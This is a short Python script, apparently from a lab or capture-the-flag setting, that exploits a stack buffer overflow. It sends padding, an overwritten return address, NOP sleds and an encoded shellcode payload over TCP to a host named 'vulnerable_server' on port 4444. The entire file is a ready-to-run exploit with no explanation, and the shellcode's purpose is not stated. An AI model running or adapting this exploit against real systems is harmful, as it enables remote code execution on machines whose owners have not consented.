import socket
import struct

total_length = 1022
pad = b"A"*62
eip = struct.pack("<I", 0xffffd2f0)
buf =  b""
buf += b"\xbd\x16\x65\xbb\x3d\xdb\xc1\xd9\x74\x24\xf4\x5e"
buf += b"\x31\xc9\xb1\x21\x31\x6e\x14\x03\x6e\x14\x83\xc6"
buf += b"\x04\xf4\x90\x8a\xe6\x92\x4d\xb5\xd5\xe2\x18\x4f"
buf += b"\xb8\xd3\x07\xb8\xa7\x40\xfb\x14\x42\x64\x4b\xfc"
buf += b"\x1b\x89\x66\x81\x8b\x12\x11\x2e\xaa\xa4\xf5\x46"
buf += b"\xcf\xa4\xe0\x25\x46\x45\x60\x2c\x01\xd5\x24\xe7"
buf += b"\x38\x34\x85\xca\xbb\x33\xca\xac\xa2\x75\xbf\x73"
buf += b"\xbd\x2b\x3f\x8c\x3d\x73\x2a\x8c\x57\x86\x23\x6f"
buf += b"\x96\x41\xfe\xf0\x5c\x91\x78\x4c\xb5\x36\xc9\xa9"
buf += b"\xf3\x38\x3d\xb6\x03\xb1\xde\x77\xe8\xcd\xe1\x9b"
buf += b"\xe3\x7d\x9c\x96\x7c\xf8\x9f\x51\x6d\x59\xa9\x43"
buf += b"\x14\xef\xc3\x33\x24\xc2\x94\xb1\xeb\xa4\x96\x46"
buf += b"\x0a\xec\x96\xb8\xcd\x0c\x22\xb9\xcd\x0c\x54\x77"
buf += b"\x4d"
nop_pre = b"\x90"*136
nop_post = b"\x90"*136
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("vulnerable_server", 4444))
s.recv(1024)
s.sendall(pad + eip + nop_pre + buf + nop_post)
s.close()